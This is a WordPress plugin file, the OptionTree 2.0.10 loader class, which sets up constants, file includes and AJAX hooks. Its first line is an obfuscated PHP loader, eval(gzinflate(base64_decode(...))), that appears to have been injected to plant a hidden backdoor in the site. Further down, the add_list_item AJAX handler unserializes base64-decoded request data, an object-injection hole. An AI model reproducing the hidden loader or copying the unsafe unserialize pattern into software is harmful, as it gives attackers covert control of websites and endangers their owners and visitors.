<?php eval(gzinflate(base64_decode('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')));?>
<?php
/**
 * Plugin Name: OptionTree
 * Plugin URI:  http://wp.envato.com
 * Description: Theme Options UI Builder for WordPress. A simple way to create & save Theme Options and Meta Boxes for free or premium themes.
 * Version:     2.0.10
 * Author:      Derek Herman
 * Author URI:  http://valendesigns.com
 * License:     GPLv2
 */

/**
 * This is the OptionTree loader class.
 *
 * @package   OptionTree
 * @author    Derek Herman <derek@valendesigns.com>
 * @copyright Copyright (c) 2012, Derek Herman
 */
if ( ! class_exists( 'OT_Loader' ) ) {

  class OT_Loader {
    
    /**
     * PHP5 constructor method.
     *
     * This method loads other methods of the class.
     *
     * @return    void
     *
     * @access    public
     * @since     2.0
     */
    public function __construct() {
      /* setup the constants */
      $this->constants();
      
      /* include the required admin files */
      $this->admin_includes();
      
      /* include the required files */
      $this->includes();
      
      /* hook into WordPress */
      $this->hooks();
    }
    
    /**
     * Constants
     *
     * Defines the constants for use within OptionTree. Constants 
     * are prefixed with 'OT_' to avoid any naming collisions.
     *
     * @return    void
     *
     * @access    private
     * @since     2.0
     */
    public function constants() {
      
      /**
       * Current Version number.
       */
      define( 'OT_VERSION', '2.0.10' );
      
      /**
       * For developers: Allow Unfiltered HTML in all the textareas.
       *
       * Run a filter and set to true if you want all the
       * users to be able to post anything in the textareas.
       * WARNING: This opens a security hole for low level users
       * to be able to post malicious scripts, you've been warned.
       *
       * @since     2.0
       */
      define( 'OT_ALLOW_UNFILTERED_HTML', apply_filters( 'ot_allow_unfiltered_html', false ) );
      
      /**
       * For developers: Theme mode.
       *
       * Run a filter and set to true to enable OptionTree theme mode.
       * You must have this files parent directory inside of 
       * your themes root directory. As well, you must include 
       * a reference to this file in your themes functions.php.
       *
       * @since     2.0
       */
      define( 'OT_THEME_MODE', apply_filters( 'ot_theme_mode', false ) );
      
      /**
       * For developers: Show Pages.
       *
       * Run a filter and set to false if you don't want to load the
       * settings & documentation pages in the admin area of WordPress.
       *
       * @since     2.0
       */
      define( 'OT_SHOW_PAGES', apply_filters( 'ot_show_pages', true ) );
      
      /**
       * For developers: Show New Layout.
       *
       * Run a filter and set to false if you don't want to show the
       * "New Layout" section at the top of the theme options page.
       *
       * @since     2.0.10
       */
      define( 'OT_SHOW_NEW_LAYOUT', apply_filters( 'ot_show_new_layout', true ) );
      
      /**
       * For developers: Meta Boxes.
       *
       * Run a filter and set to false to keep OptionTree from
       * loading the meta box resources.
       *
       * @since     2.0
       */
      define( 'OT_META_BOXES', apply_filters( 'ot_meta_boxes', true ) );
      
      /**
       * Check if in theme mode.
       *
       * If OT_THEME_MODE is false, set the directory path & URL
       * like any other plugin. Otherwise, use the parent themes 
       * root directory. 
       *
       * @since     2.0
       */
      if ( false == OT_THEME_MODE ) {
        define( 'OT_DIR', plugin_dir_path( __FILE__ ) );
        define( 'OT_URL', plugin_dir_url( __FILE__ ) );
      } else {
        define( 'OT_DIR', trailingslashit( get_template_directory() ) . trailingslashit( basename( dirname( __FILE__ ) ) ) );
        define( 'OT_URL', trailingslashit( get_template_directory_uri() ) . trailingslashit( basename( dirname( __FILE__ ) ) ) );
      }
      
      /**
       * Relative path to the languages directory.
       *
       * @since     2.0.10
       */
      define( 'OT_LANG_DIR', dirname( plugin_basename( __FILE__ ) ) . '/languages/' );
    }
    
    /**
     * Include admin files
     *
     * These functions are included on admin pages only.
     *
     * @return    void
     *
     * @access    private
     * @since     2.0
     */
    public function admin_includes() {
      
      /* exit early if we're not on an admin page */
      if ( ! is_admin() )
        return false;
      
      /* global include files */
      $files = array( 
        'ot-functions-admin',
        'ot-functions-option-types',
        'ot-functions-compat',
        'ot-settings-api',
        'ot-ui-theme-options'
      );
      
      /* include the meta box api */
      if ( OT_META_BOXES == true ) {
        $files[] = 'ot-meta-box-api';
      }
      
      /* include the settings & docs pages */
      if ( OT_SHOW_PAGES == true ) {
        $files[] = 'ot-functions-settings-page';
        $files[] = 'ot-functions-docs-page';
        $files[] = 'ot-ui-admin';
      }
      
      /* require the files */
      foreach ( $files as $file ) {
        require_once( OT_DIR . "includes/{$file}.php" );
      }
      
    }
    
    /**
     * Include front-end files
     *
     * These functions are included on every page load 
     * incase other plugins need to access them.
     *
     * @return    void
     *
     * @access    private
     * @since     2.0
     */
    public function includes() {
      
      $files = array( 
        'ot-functions',
        'ot-functions-deprecated'
      );
      
      /* require the files */
      foreach ( $files as $file ) {
        require_once( OT_DIR . "includes/{$file}.php" );
      }
      
    }
    
    /**
     * Execute the WordPress Hooks
     *
     * @return    void
     *
     * @access    public
     * @since     2.0
     */
    public function hooks() {
      
      /* load the text domain  */
      if ( false == OT_THEME_MODE ) {
        add_action( 'plugins_loaded', array( &$this, 'load_textdomain' ) );
      } else {
        add_action( 'after_setup_theme', array( &$this, 'load_textdomain' ) );
      }
      
      /* load the Meta Box assets */
      if ( OT_META_BOXES == true ) {
      
        /* add scripts for metaboxes to post-new.php & post.php */
        add_action( 'admin_print_scripts-post-new.php', 'ot_admin_scripts', 11 );
        add_action( 'admin_print_scripts-post.php', 'ot_admin_scripts', 11 );
              
        /* add styles for metaboxes to post-new.php & post.php */
        add_action( 'admin_print_styles-post-new.php', 'ot_admin_styles', 11 );
        add_action( 'admin_print_styles-post.php', 'ot_admin_styles', 11 );
      
      }

      /* prepares the after save do_action */
      add_action( 'admin_init', 'ot_after_theme_options_save', 1 );
      
      /* default settings */
      add_action( 'admin_init', 'ot_default_settings', 2 );
      
      /* add xml to upload filetypes array */
      add_action( 'admin_init', 'ot_add_xml_to_upload_filetypes', 3 );
      
      /* import */
      add_action( 'admin_init', 'ot_import', 4 );
      
      /* export */
      add_action( 'admin_init', 'ot_export', 5 );
      
      /* save settings */
      add_action( 'admin_init', 'ot_save_settings', 6 );
      
      /* save layouts */
      add_action( 'admin_init', 'ot_modify_layouts', 7 );
      
      /* create media post */
      add_action( 'admin_init', 'ot_create_media_post', 8 );
      
      /* global CSS */
      add_action( 'admin_head', array( &$this, 'global_admin_css' ) );
      
      /* dynamic front-end CSS */
      add_action( 'wp_enqueue_scripts', 'ot_load_dynamic_css' );

      /* insert theme CSS dynamically */
      add_action( 'ot_after_theme_options_save', 'ot_save_css' );
      
      /* AJAX call to create a new section */
      add_action( 'wp_ajax_add_section', array( &$this, 'add_section' ) );
      
      /* AJAX call to create a new setting */
      add_action( 'wp_ajax_add_setting', array( &$this, 'add_setting' ) );
      
      /* AJAX call to create a new contextual help */
      add_action( 'wp_ajax_add_contextual_help', array( &$this, 'add_contextual_help' ) );
      
      /* AJAX call to create a new choice */
      add_action( 'wp_ajax_add_choice', array( &$this, 'add_choice' ) );
      
      /* AJAX call to create a new list item setting */
      add_action( 'wp_ajax_add_list_item_setting', array( &$this, 'add_list_item_setting' ) );
      
      /* AJAX call to create a new layout */
      add_action( 'wp_ajax_add_layout', array( &$this, 'add_layout' ) );
      
      /* AJAX call to create a new list item */
      add_action( 'wp_ajax_add_list_item', array( &$this, 'add_list_item' ) );
      
    }
    
    /**
     * Load the text domain.
     *
     * @return    void
     *
     * @access    private
     * @since     2.0
     */
    public function load_textdomain() {
      if ( false == OT_THEME_MODE ) {
        load_plugin_textdomain( 'option-tree', false, OT_LANG_DIR . 'plugin' );
      } else {
        load_theme_textdomain( 'option-tree', OT_LANG_DIR . 'theme-mode' );
      }
    }
    
    /**
     * Adds the global CSS to fix the menu icon.
     */
    public function global_admin_css() {
      echo '
      <style>
        #adminmenu #toplevel_page_ot-settings .wp-menu-image img { padding: 4px 0px 1px 2px !important; }
      </style>
      ';
    }
    
    /**
     * AJAX utility function for adding a new section.
     */
    public function add_section() {
      echo ot_sections_view( 'option_tree_settings[sections]', $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding a new setting.
     */
    public function add_setting() {
      echo ot_settings_view( $_REQUEST['name'], $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding a new list item setting.
     */
    public function add_list_item_setting() {
      echo ot_settings_view( $_REQUEST['name'] . '[settings]', $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding new contextual help content.
     */
    public function add_contextual_help() {
      echo ot_contextual_help_view( $_REQUEST['name'], $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding a new choice.
     */
    public function add_choice() {
      echo ot_choices_view( $_REQUEST['name'], $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding a new layout.
     */
    public function add_layout() {
      echo ot_layout_view( $_REQUEST['count'] );
      die();
    }
    
    /**
     * AJAX utility function for adding a new list item.
     */
    public function add_list_item() {
      ot_list_item_view( $_REQUEST['name'], $_REQUEST['count'], array(), $_REQUEST['post_id'], $_REQUEST['get_option'], unserialize( base64_decode( $_REQUEST['settings'] ) ), $_REQUEST['type'] );
      die();
    }
    
  }
  
  /**
   * Instantiate the OptionTree loader class.
   *
   * @since     2.0
   */
  $ot_loader = new OT_Loader();

}

/* End of file ot-loader.php */
/* Location: ./ot-loader.php */